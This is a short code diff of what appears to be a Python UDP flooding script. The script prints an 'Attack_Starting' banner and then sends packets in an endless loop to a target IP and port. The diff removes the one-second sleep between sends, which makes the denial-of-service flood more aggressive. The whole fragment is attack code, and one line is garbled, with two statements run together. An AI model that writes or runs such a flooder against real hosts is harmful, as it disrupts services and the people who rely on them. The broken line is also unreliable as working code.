@@ -33,5 +33,5 @@ os.system("clear")
 os.system("figlet Attack_Starting")
 while True: 
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)      sock.sendto(bytes(joker,"UTF-8"), (ip,port))
-    time.sleep(1)
+    
     print(port ,f"{green}<==packet send to==>", ip)
